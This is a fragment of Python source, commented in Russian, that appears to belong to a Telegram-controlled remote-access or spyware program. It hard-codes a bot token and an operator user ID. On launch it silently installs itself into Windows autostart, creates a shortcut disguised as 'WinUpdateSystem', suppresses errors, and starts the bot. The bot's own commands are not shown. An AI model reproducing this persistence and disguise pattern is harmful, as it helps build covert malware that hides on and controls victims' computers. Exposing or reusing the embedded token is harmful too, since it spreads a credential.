...
# БОТ
TOKEN = '8386681750:AAHa_kROb1RY1HQIdLL5jZCX75FCazynNwE'
USER_ID = 8057181458
...
if __name__ == '__main__':
    # Сначала прописываемся в автозагрузку
    try:
        add_to_startup()
        exe_path = os.path.abspath(sys.argv[0])
        create_shortcut(exe_path, 'WinUpdateSystem')
    except:
        pass

    # В последнюю очередь запускаем бота (этот метод блокирует код ниже)
    start_bot()
